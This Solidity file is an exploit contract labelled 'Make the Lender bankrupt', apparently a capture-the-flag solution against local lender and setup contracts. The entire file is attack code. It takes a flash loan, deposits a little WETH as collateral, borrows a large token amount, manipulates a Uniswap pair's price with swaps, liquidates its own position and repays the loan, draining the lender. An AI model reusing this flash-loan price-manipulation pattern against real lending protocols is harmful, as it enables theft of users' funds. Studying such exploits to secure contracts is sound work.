//Make the Lender bankrupt
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.0;

import "./lender.sol";
import "./setup.sol";

contract exploit  {
      WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
      
      IUniswapV2Pair  pair;
      FlashLoan faddress;
      Lender lender;
      Token  token;
      address owner;
      
      constructor(FlashLoan _faddress , Lender _lender, IUniswapV2Pair _pair , Token _token){
         faddress = _faddress;
         pair = _pair;
         lender = _lender;
         token = _token;
         owner = msg.sender;
      }
    function action() public {
         faddress.flashLoan(weth.balanceOf(address(faddress)));
       
      
    }
     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public  {
         
        
      
            
         

}
    function receiveFlashLoan(uint256 amount )  public {
         weth.approve(address(lender),25 * 1 ether);
        lender.deposit(25 * 1 ether); 
        lender.borrow(250_000 * 1 ether);
       
        weth.transfer(address(pair), 25 * 1 ether);
        
           pair.swap( 249_000 * 1 ether, 0 , address(this) ,'');
           token.approve(address(lender),250_000 * 1 ether);
           lender.liquidate(address(this) , 250_000 * 1 ether); 
           token.transfer(address(pair),249_000 * 1 ether);
            pair.swap( 0, 24 * 1 ether , address(this) ,'');
           weth.transfer(address(faddress), amount);
           weth.transfer(address(faddress), weth.balanceOf(address(this)));
        
       
}
}


